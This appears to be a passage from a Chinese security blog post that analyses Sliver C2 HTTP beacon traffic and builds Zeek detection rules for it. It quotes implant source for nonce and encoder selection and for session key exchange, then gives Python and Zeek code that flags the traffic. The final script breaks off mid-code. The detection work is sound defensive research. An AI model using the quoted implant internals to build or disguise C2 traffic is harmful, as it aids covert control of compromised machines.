<p>该参数是由 <a href="https://github.com/BishopFox/sliver/blob/v1.5.41/implant/sliver/transports/httpclient/httpclient.go#L196">NonceQueryArgument</a> 方法生成。此方法将会随机生成一个长度为1的字符串作为Key，并同时在<code>value</code>中插入0到2个随机字符作为Value。此处<code>value</code>实际是通过 <a href="https://github.com/BishopFox/sliver/blob/master/implant/sliver/encoders/encoders.go#L127">RandomEncoder</a> 方法中的<code>(insecureRand.Intn(maxN) * EncoderModulus) + encoderID</code>代码生成的<code>nonce</code>数值。</p>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231108104044549.png" alt="image-20231108104044549"></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// NonceQueryArgument - Adds a nonce query argument to the URL</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *SliverHTTPClient)</span> <span class="title">NonceQueryArgument</span><span class="params">(uri *url.URL, value <span class="keyword">uint64</span>)</span> *<span class="title">url</span>.<span class="title">URL</span></span> &#123;</span><br><span class="line">	values := uri.Query()</span><br><span class="line">	key := nonceQueryArgs[insecureRand.Intn(<span class="built_in">len</span>(nonceQueryArgs))]</span><br><span class="line">	argValue := fmt.Sprintf(<span class="string">&quot;%d&quot;</span>, value)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; insecureRand.Intn(<span class="number">3</span>); i++ &#123;</span><br><span class="line">		index := insecureRand.Intn(<span class="built_in">len</span>(argValue))</span><br><span class="line">		char := <span class="keyword">string</span>(nonceQueryArgs[insecureRand.Intn(<span class="built_in">len</span>(nonceQueryArgs))])</span><br><span class="line">		argValue = argValue[:index] + char + argValue[index:]</span><br><span class="line">	&#125;</span><br><span class="line">	values.Add(<span class="keyword">string</span>(key), argValue)</span><br><span class="line">	uri.RawQuery = values.Encode()</span><br><span class="line">	<span class="keyword">return</span> uri</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RandomEncoder - Get a random nonce identifier and a matching encoder</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RandomEncoder</span><span class="params">()</span> <span class="params">(<span class="keyword">int</span>, Encoder)</span></span> &#123;</span><br><span class="line">	keys := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>, <span class="built_in">len</span>(EncoderMap))</span><br><span class="line">	<span class="keyword">for</span> k := <span class="keyword">range</span> EncoderMap &#123;</span><br><span class="line">		keys = <span class="built_in">append</span>(keys, k)</span><br><span class="line">	&#125;</span><br><span class="line">	encoderID := keys[insecureRand.Intn(<span class="built_in">len</span>(keys))]</span><br><span class="line">	nonce := (insecureRand.Intn(maxN) * EncoderModulus) + encoderID</span><br><span class="line">	<span class="keyword">return</span> nonce, EncoderMap[encoderID]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Encoder Map：</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>Encoder</th>
</tr>
</thead>
<tbody><tr>
<td>13</td>
<td>Base64 with modified alphabet</td>
</tr>
<tr>
<td>22</td>
<td>PNG</td>
</tr>
<tr>
<td>31</td>
<td>English words</td>
</tr>
<tr>
<td>43</td>
<td>Base58 with modified alphabet</td>
</tr>
<tr>
<td>45</td>
<td>English words + Gzip compression</td>
</tr>
<tr>
<td>49</td>
<td>Gzip compression</td>
</tr>
<tr>
<td>64</td>
<td>Base64 + Gzip compression</td>
</tr>
<tr>
<td>65</td>
<td>Base32 + Gzip compression</td>
</tr>
<tr>
<td>92</td>
<td>Hex</td>
</tr>
</tbody></table>
<p>所以，我们根据代码片段可以反向推导出这个<code>nonce </code>值实际是对应到了Sliver中的<code>encoderID</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">encoders = &#123;</span><br><span class="line">    <span class="number">13</span>: <span class="string">&quot;b64&quot;</span>,</span><br><span class="line">    <span class="number">31</span>: <span class="string">&quot;words&quot;</span>,</span><br><span class="line">    <span class="number">22</span>: <span class="string">&quot;png&quot;</span>,</span><br><span class="line">    <span class="number">43</span>: <span class="string">&quot;b58&quot;</span>,</span><br><span class="line">    <span class="number">45</span>: <span class="string">&quot;gzip-words&quot;</span>,</span><br><span class="line">    <span class="number">49</span>: <span class="string">&quot;gzip&quot;</span>,</span><br><span class="line">    <span class="number">64</span>: <span class="string">&quot;gzip-b64&quot;</span>,</span><br><span class="line">    <span class="number">65</span>: <span class="string">&quot;b32&quot;</span>,</span><br><span class="line">    <span class="number">92</span>: <span class="string">&quot;hex&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_nonce</span>(<span class="params">nonce_value</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Takes a nonce value from a HTTP Request and returns the encoder that was used&quot;&quot;&quot;</span></span><br><span class="line">    nonce_value = <span class="built_in">int</span>(re.sub(<span class="string">&#x27;[^0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>, nonce_value))</span><br><span class="line">    encoder_id = nonce_value % <span class="number">101</span></span><br><span class="line">    <span class="keyword">return</span> encoders[encoder_id]</span><br><span class="line">  </span><br><span class="line">In [<span class="number">1</span>]: decode_nonce(<span class="string">&quot;8148k7556&quot;</span>)</span><br><span class="line">Out[<span class="number">1</span>]: <span class="string">&#x27;gzip&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>POST Body里面有什么？这些数据是怎么来的？</p>
<ol>
<li>先回答第一个问题，POST Body里面是一个长度为266个字节的加密数据。</li>
<li>关于第二个问题，我按照我的理解给大家画了一个POST Body数据生成的Workflow。来来来，我们看图说话：</li>
</ol>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231108111232203.png" alt="image-20231108111232203"></p>
<ul>
<li><p>第1步：Client通过 <a href="https://github.com/BishopFox/sliver/blob/v1.5.41/implant/sliver/cryptography/crypto.go">cryptography.RandomKey()</a> 方法随机生成一个32字节的<code>sKey</code>，这个<code>sKey</code>很重要后续的命令执行都会通过这个<code>sKey</code>进行加密。由于这里采用的是对称加密，所以解密也会用到这个<code>sKey</code>。这也就解释了为什么我们说第一次的POST请求是交换密钥，因为Server需要这个<code>sKey</code>做后续请求内容的解密。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">sKey := cryptography.RandomKey()</span><br><span class="line"></span><br><span class="line"><span class="comment">// RandomKey - Generate random ID of randomIDSize bytes</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RandomKey</span><span class="params">()</span> [<span class="title">chacha20poly1305</span>.<span class="title">KeySize</span>]<span class="title">byte</span></span> &#123;</span><br><span class="line">	randBuf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">64</span>)</span><br><span class="line">	rand.Read(randBuf)</span><br><span class="line">	<span class="keyword">return</span> deriveKeyFrom(randBuf)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>第2步：通过 <a href="https://github.com/BishopFox/sliver/blob/v1.5.41/implant/sliver/transports/httpclient/httpclient.go#L178">proto.Marshal()</a> 方法对第一步生成的<code>sKey</code>进行序列化，这时候<code>sKey</code>的长度从32字节变成了34字节。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s.SessionCtx = cryptography.NewCipherContext(sKey)</span><br><span class="line">httpSessionInit := &amp;pb.HTTPSessionInit&#123;Key: sKey[:]&#125;</span><br><span class="line">data, _ := proto.Marshal(httpSessionInit)</span><br></pre></td></tr></table></figure>

<p>关于为什么会多出2个字节<code>0a20</code>？我反手就是一个ChatGPT。</p>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231107175632660.png" alt="image-20231107175632660"></p>
</li>
<li><p>第3步：通过HMAC（Hash-based Message Authentication Code）来保证<code>sKey</code>完整性和真实性。</p>
<ul>
<li>首先创建了一个新的HMAC实例</li>
<li>接着使用implant’s private key的哈希值作为HMAC的密钥</li>
<li>最后对<code>plaintext</code>处理得到HMAC值</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">peerKeyPair := GetPeerAgeKeyPair()</span><br><span class="line"></span><br><span class="line"><span class="comment">// First HMAC the plaintext with the hash of the implant&#x27;s private key</span></span><br><span class="line"><span class="comment">// this ensures that the server is talking to a valid implant</span></span><br><span class="line">privateDigest := sha256.New()</span><br><span class="line">privateDigest.Write([]<span class="keyword">byte</span>(peerKeyPair.Private))</span><br><span class="line">mac := hmac.New(sha256.New, privateDigest.Sum(<span class="literal">nil</span>))</span><br><span class="line">mac.Write(plaintext)</span><br></pre></td></tr></table></figure></li>
<li><p>第4步：通过 <a href="https://github.com/BishopFox/sliver/blob/v1.5.41/implant/sliver/cryptography/crypto.go#L69">AgeEncrypt()</a> 方法，使用Server Public Key对<code>plaintext</code>进行加密。通过源码可以看到这里将HMAC值（32字节）添加到<code>plaintext</code>消息的前面。这样做是为了确保消息的完整性，Server端只需用同样的方法计算HMAC值并与<code>plaintext</code>中的前32字节进行对比，就可以知道消息在传输过程中是否被篡改。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ciphertext, err := AgeEncrypt(recipientPublicKey, <span class="built_in">append</span>(mac.Sum(<span class="literal">nil</span>), plaintext...))</span><br><span class="line"></span><br><span class="line"><span class="comment">// AgeEncrypt - Encrypt using Nacl Box</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AgeEncrypt</span><span class="params">(recipientPublicKey <span class="keyword">string</span>, plaintext []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> !strings.HasPrefix(recipientPublicKey, agePublicKeyPrefix) &#123;</span><br><span class="line">		recipientPublicKey = agePublicKeyPrefix + recipientPublicKey</span><br><span class="line">	&#125;</span><br><span class="line">	recipient, err := age.ParseX25519Recipient(recipientPublicKey)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	buf := bytes.NewBuffer([]<span class="keyword">byte</span>&#123;&#125;)</span><br><span class="line">	stream, err := age.Encrypt(buf, recipient)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> _, err := stream.Write(plaintext); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := stream.Close(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> bytes.TrimPrefix(buf.Bytes(), ageMsgPrefix), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>第5步：这段代码构建了一个消息<code>msg</code>，这个<code>msg</code>也就是Body在编码之前的样子。该消息包含了implant’s public key的HASH值和加密后的数据，总长度266字节。C2 Server 可以通过对比前32个字节中的HASH值来验证implant’s public key的真实性，并使用Server Pivate Key解密后面的数据。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Sender includes hash of it&#x27;s implant specific peer public key</span></span><br><span class="line">publicDigest := sha256.Sum256([]<span class="keyword">byte</span>(peerKeyPair.Public))</span><br><span class="line">msg := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">32</span>+<span class="built_in">len</span>(ciphertext))</span><br><span class="line"><span class="built_in">copy</span>(msg, publicDigest[:])</span><br><span class="line"><span class="built_in">copy</span>(msg[<span class="number">32</span>:], ciphertext)</span><br></pre></td></tr></table></figure>

<p>最后的最后，Client会通过<a href="https://github.com/BishopFox/sliver/blob/v1.5.41/implant/sliver/encoders/encoders.go#L61">encoder.Encode()</a>方法将266个字节的加密数据进行编码，所以我们捕获流量看到的PCAP数据已经不是“最初”的样子了，因为这段数据已经被编码过了。</p>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231108112034359.png" alt="image-20231108112034359"></p>
</li>
<li><p><strong>结论：</strong>当你看完这部分源码后你其实会发现，整个过程都是为了保护这个sKey不被泄露。最终我们可以得出一个简单的数据结构图，POST Body由截图中的3个部分组成。</p>
</li>
</ul>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231107211334773.png" alt="image-20231107211334773"></p>
<p>​    这是我模拟加密过程的输出，其中每个阶段的字节数都已经打印在界面上。</p>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231108110145849.png" alt="image-20231108110145849"></p>
<p><strong>结合上面的分析，我们可以抽象出对第一个POST请求的检测特征，如下图所示：</strong></p>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231108163024578.png" alt="image-20231108163024578"></p>
<p><strong>Zeek 代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">event http_message_done(c: connection, is_orig: bool, stat: http_message_stat) &#123;</span><br><span class="line">  if (c$http$method == &quot;POST&quot; &amp;&amp; </span><br><span class="line">      c$http$status_code == 200 &amp;&amp; </span><br><span class="line">      c$http?$set_cookie &amp;&amp; </span><br><span class="line">      is_suspicious_cookie(c$http$set_cookie) &amp;&amp; </span><br><span class="line">      is_suspicious_query(c$http$method, c$http$uri)) &#123;</span><br><span class="line"></span><br><span class="line">    # record suspicious connections</span><br><span class="line">    http_connection_state[c$http$uid] = split_string(c$http$set_cookie, /;/)[0];</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<ol start="2">
<li><p>在完成第一个可疑连接的捕获之后，接下来我们需要把重心回答如何检测HTTP的”信标“流量上了。（其实这里已经简单很多了，最难的其实是交换密钥的特征）如下图，我们可以把POST之后的GET请求可以看做都是“信标”通信流量。Sliver会采用“抖动”的方式规避基于周期性的检测，当然也包括uri的随机性。</p>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231101170122908.png" alt="image-20231101170122908"></p>
<ul>
<li><p>如上图，截图中的3个GET请求中每次的uri都是随机的，每次的编码方式也是随机的。好在这里对于“信标”特征的检测思路，可以复用之前参数检测的部分。所以，GET请求中的参数是通过<a href="https://github.com/BishopFox/sliver/blob/v1.5.41/implant/sliver/transports/httpclient/httpclient.go#L196">NonceQueryArgument</a> 方法生成的。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// NonceQueryArgument - Adds a nonce query argument to the URL</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *SliverHTTPClient)</span> <span class="title">NonceQueryArgument</span><span class="params">(uri *url.URL, value <span class="keyword">int</span>)</span> *<span class="title">url</span>.<span class="title">URL</span></span> &#123;</span><br><span class="line">	values := uri.Query()</span><br><span class="line">	key := nonceQueryArgs[insecureRand.Intn(<span class="built_in">len</span>(nonceQueryArgs))]</span><br><span class="line">	argValue := fmt.Sprintf(<span class="string">&quot;%d&quot;</span>, value)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; insecureRand.Intn(<span class="number">3</span>); i++ &#123;</span><br><span class="line">		index := insecureRand.Intn(<span class="built_in">len</span>(argValue))</span><br><span class="line">		char := <span class="keyword">string</span>(nonceQueryArgs[insecureRand.Intn(<span class="built_in">len</span>(nonceQueryArgs))])</span><br><span class="line">		argValue = argValue[:index] + char + argValue[index:]</span><br><span class="line">	&#125;</span><br><span class="line">	values.Add(<span class="keyword">string</span>(key), argValue)</span><br><span class="line">	uri.RawQuery = values.Encode()</span><br><span class="line">	<span class="keyword">return</span> uri</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>源码中关于<a href="https://github.com/BishopFox/sliver/blob/e4ade4e8c982352e1e2b17787b19724bf3903ff7/protobuf/clientpb/client.proto">beacon</a>的默认设置</p>
<ul>
<li><code>BeaconInterval</code>： 轮训时间 3s </li>
<li><code>BeaconJitter</code>：抖动时间 4s</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">message ImplantConfig &#123;</span><br><span class="line">  <span class="keyword">string</span> ID = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">bool</span> IsBeacon = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">int64</span> BeaconInterval = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">int64</span> BeaconJitter = <span class="number">4</span>;</span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>结合上面的分析，我们可以抽象出对”信标“请求的流量检测特征，如下图所示。</p>
<p><img src="/2023/11/08/Zeek-Detect-Sliver/image-20231103160641641.png" alt="image-20231103160641641"></p>
<p><strong>Zeek 代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Event handler to process and inspect completed HTTP messages</span><br><span class="line">event http_message_done(c: connection, is_orig: bool, stat: http_message_stat) &#123;</span><br><span class="line">    if (c$http$method == &quot;GET&quot; &amp;&amp; c$http$status_code == 204 &amp;&amp; c$http?$cookie &amp;&amp; </span><br><span class="line">        (c$http$uid in http_connection_state) &amp;&amp; </span><br><span class="line">        (c$http$cookie == http_connection_state[c$http$uid])) &#123;</span><br><span class="line"></span><br><span class="line">        local key_str = fmt(&quot;%s#####%s#####%s#####%s#####%s&quot;, </span><br><span class="line">                            c$http$uid, c$id$orig_h, c$http$host, c$id$resp_p, c$http$cookie);</span><br><span class="line">        local observe_str = c$http$uri;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h4 id="难点："><a href="#难点：" class="headerlink" title="难点："></a>难点：</h4><ol>
<li>问：如何在同一个TCP连接中，关联多个HTTP请求的上下文，实现场景的判断？</li>
</ol>
<p>​    答：这里可以尝试通过维护一个HTTP状态表来实现同一个uid下的多个HTTP请求关联。例如，将符合<strong>阶段-1</strong>的处理结果存储到<code>http_connection_state</code>中，后续只需通过检查HTTP状态表中的状态来执行之后的逻辑。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">## Global table to store cookie state.</span><br><span class="line">global http_connection_state: table[string] of string;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>问：如何避免http_connection_state set无限扩大，降低”无效”uid的填充set？</li>
</ol>
<p>​    答：对于这个问题，可以使用Zeek的<a href="https://docs.zeek.org/en/master/script-reference/attributes.html#attr-&create_expire"><strong>create_expire</strong></a>属性，用它来管理整个http_connection_state set的生命周期。按照我们之前的分析，Sliver的HTTP C2流量在密钥交换之后，会进行C2数据包轮训，“信标”时间会有1~4秒抖动。所以，我们可以给这个可疑uid设置一个<code>create_expire</code>属性。如：<code>create_expire=300sec</code>，那么300秒之后我们会自动删除http_connection_state 中的 http_uid，通常这个时间内已经足够我们判断该HTTP请求流中是否为Sliver HTTP beacon traffic了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">## Global table to store cookie state.</span><br><span class="line">global http_connection_state: table[string] of string &amp;create_expire=<span class="number">300</span>sec;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>问：如何实现对规则的快速启停以及调整，避免规则更新重启整个Zeek集群？</li>
</ol>
<p>​    答：这里建议使用Zeek的<a href="https://docs.zeek.org/en/master/frameworks/configuration.html#configuration-framework"><strong>Configuration Framework</strong></a>，只需将规则中的配置写入到文件中，后续只需要更改配置文件就可以实现”热“加载，从而不需要对Zeek进行<code>deploy</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">## Define <span class="keyword">module</span>-level configuration options.</span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">    ## Option to turn on/off detection.</span><br><span class="line">    option enable: <span class="keyword">bool</span> = T;</span><br><span class="line">    </span><br><span class="line">    ## Path to additional configuration <span class="keyword">for</span> detection.</span><br><span class="line">    redef Config::config_files += &#123; <span class="string">&quot;/usr/local/zeek/share/zeek/site/rules/Sliver/config.dat&quot;</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>问：如何让规则只对指定的Zeek Worker生效？例如，我的环境中有30台Zeek，但是实际接入内对外流量Zeek只有2台，剩下都是外对内的流量。</li>
</ol>
<p>​    答：可以在代码中增加针对Zeek机器IP的判断，只针对指定的Zeek Worker IP进行规则的生效。这样一来，该规则也只需要在内对外的2台Zeek上生效，避免在负载很高的外对内的Zeek Worker上进行计算。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">event <span class="title">http_message_done</span><span class="params">(c: connection, is_orig: <span class="keyword">bool</span>, stat: http_message_stat)</span> </span>&#123;</span><br><span class="line">    ## Return early <span class="keyword">if</span> detection is disabled <span class="keyword">or</span> sensor IP is <span class="keyword">not</span> allowed.</span><br><span class="line">    <span class="keyword">if</span> (c$http$sensor_ip ! in allow_sensor)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><p>问：如何解码请求参数中的EncoderID？</p>
<p>答：废话少说，放“码”过来</p>
<ul>
<li><p>Zeek Code</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">## Decode nonce value to identify the encoder used in traffic encoding.</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">decode_nonce</span><span class="params">(nonce: string)</span>: int &#123;</span></span><br><span class="line">    local nonce_value = <span class="built_in">to_int</span>(<span class="built_in">gsub</span>(nonce, /[^[:digit:]]/, <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> nonce_value % <span class="number">101</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>Python Code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Decode nonce value to identify the encoder used in traffic encoding.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_nonce</span>(<span class="params">nonce_value</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Takes a nonce value from a HTTP Request and returns the encoder that was used&quot;&quot;&quot;</span></span><br><span class="line">    nonce_value = <span class="built_in">int</span>(re.sub(<span class="string">&#x27;[^0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>, nonce_value))</span><br><span class="line">    <span class="keyword">return</span> nonce_value % <span class="number">101</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>问：如何解码Post Body中的内容？</p>
<p>答：详细参考这个文章吧 <a href="https://www.hackplayers.com/2023/03/solucion-al-reto-sliver-forensics-de.html"><strong>Solución al reto Sliver Forensics de #hc0n2023</strong></a></p>
</li>
</ol>
<h4 id="Detect-Sliver-HTTP-beacon-traffic-Demo-检测代码"><a href="#Detect-Sliver-HTTP-beacon-traffic-Demo-检测代码" class="headerlink" title="Detect Sliver HTTP beacon traffic (Demo) 检测代码"></a>Detect Sliver HTTP beacon traffic (Demo) 检测代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">## Module to detect Sliver HTTP traffic based on specific criteria.</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> SliverHttpTraffic;</span><br><span class="line"></span><br><span class="line"># Define a <span class="keyword">new</span> notice type <span class="keyword">for</span> Sliver HTTP beacon traffic.</span><br><span class="line">redef <span class="keyword">enum</span> Notice::Type += &#123;</span><br><span class="line">    Sliver_HTTP_Beacon_Traffic</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"># Global configuration <span class="keyword">and</span> settings</span><br><span class="line">global http_connection_state: table[string] of string &amp;create_expire=<span class="number">3600</span>sec;</span><br><span class="line">global encoder_ids: set[<span class="keyword">int</span>] = [<span class="number">13</span>, <span class="number">22</span>, <span class="number">31</span>, <span class="number">43</span>, <span class="number">45</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">65</span>, <span class="number">92</span>];</span><br><span class="line">global cookie_len: <span class="keyword">int</span> = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line"># Extending the HTTP::Info record to capture cookie-related details</span><br><span class="line">redef record HTTP::Info += &#123;</span><br><span class="line">    cookie:     string &amp;log &amp;optional;   # Value of the Cookie header</span><br><span class="line">    set_cookie: string &amp;log &amp;optional;   # Value of the Set-Cookie header</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"># Extend the <span class="keyword">default</span> notice record to capture specific details related to Sliver traffic.</span><br><span class="line">redef record Notice::Info += &#123;</span><br><span class="line">    host:   string &amp;log &amp;optional;      # Hostname involved in the suspicious activity</span><br><span class="line">    uris:   set[string] &amp;log &amp;optional; # Set of suspicious URIs accessed</span><br><span class="line">    cookie: string &amp;log &amp;optional;      # Suspicious cookie associated with the request</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"># <span class="function">Event handler to capture HTTP header information</span></span><br><span class="line"><span class="function">event <span class="title">http_header</span><span class="params">(c: connection, is_orig: <span class="keyword">bool</span>, name: string, value: string)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_orig &amp;&amp; name == <span class="string">&quot;COOKIE&quot;</span>) &#123;</span><br><span class="line">        c$http$cookie = value;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!is_orig &amp;&amp; name == <span class="string">&quot;SET-COOKIE&quot;</span>) &#123;</span><br><span class="line">        c$http$set_cookie = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># <span class="function">Utility function to decode nonce values</span></span><br><span class="line"><span class="function">function <span class="title">decode_nonce</span><span class="params">(nonce: string)</span>: int &#123;</span></span><br><span class="line">    local nonce_value = <span class="built_in">to_int</span>(<span class="built_in">gsub</span>(nonce, /[^[:digit:]]/, <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> nonce_value % <span class="number">101</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># <span class="function">Function to check <span class="keyword">if</span> an HTTP query is suspicious</span></span><br><span class="line"><span class="function">function <span class="title">is_suspicious_query</span><span class="params">(method: string, uri: string)</span>: bool &#123;</span></span><br><span class="line">    local url = <span class="built_in">decompose_uri</span>(uri);</span><br><span class="line">    local encoder_id: <span class="keyword">int</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!url?$params) <span class="keyword">return</span> F;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method == <span class="string">&quot;POST&quot;</span> &amp;&amp; |url$params| == <span class="number">2</span>) &#123;</span><br><span class="line">        local key_length: table[count] of string;</span><br><span class="line">        <span class="keyword">for</span> (k, v in url$params) &#123;</span><br><span class="line">            <span class="keyword">if</span> (|k| &gt; <span class="number">2</span>) <span class="keyword">return</span> F;</span><br><span class="line">            key_length[|k|] = v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">2</span> ! in key_length) || (<span class="number">1</span> ! in key_length)) <span class="keyword">return</span> F;</span><br><span class="line"></span><br><span class="line">        encoder_id = <span class="built_in">decode_nonce</span>(key_length[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> encoder_id in encoder_ids;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method == <span class="string">&quot;GET&quot;</span> &amp;&amp; |url$params| == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (k, v in url$params) &#123;</span><br><span class="line">            <span class="keyword">if</span> (|k| &gt; <span class="number">1</span>) <span class="keyword">return</span> F;</span><br><span class="line"></span><br><span class="line">            encoder_id = <span class="built_in">decode_nonce</span>(v);</span><br><span class="line">            <span class="keyword">return</span> encoder_id in encoder_ids;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> F;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Check <span class="keyword">if</span> a cookie<span class="number">&#x27;</span><span class="function">s structure is suspicious</span></span><br><span class="line"><span class="function">function <span class="title">is_suspicious_cookie</span><span class="params">(cookie: string)</span>: bool &#123;</span></span><br><span class="line">    local cookies = <span class="built_in">split_string</span>(<span class="built_in">split_string</span>(cookie, /;/)[<span class="number">0</span>], /=/);</span><br><span class="line">    <span class="keyword">return</span> (|cookies| == <span class="number">2</span> &amp;&amp; |cookies[<span class="number">1</span>]| == cookie_len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># <span class="function">Event handler to process <span class="keyword">and</span> inspect completed HTTP messages</span></span><br><span class="line"><span class="function">event <span class="title">http_message_done</span><span class="params">(c: connection, is_orig: <span class="keyword">bool</span>, stat: http_message_stat)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_orig || !c?$http || !c$http?$status_code || !c$http?$method || !c$http?$uri) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (c$http$method == <span class="string">&quot;POST&quot;</span> &amp;&amp; c$http$status_code == <span class="number">200</span> &amp;&amp; c$http?$set_cookie &amp;&amp; <span class="built_in">is_suspicious_cookie</span>(c$http$set_cookie) &amp;&amp; <span class="built_in">is_suspicious_query</span>(c$http$method, c$http$uri)) &#123;</span><br><span class="line">        http_connection_state[c$http$uid] = <span class="built_in">split_string</span>(c$http$set_cookie, /;/)[<span class="number">0</span>];</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span 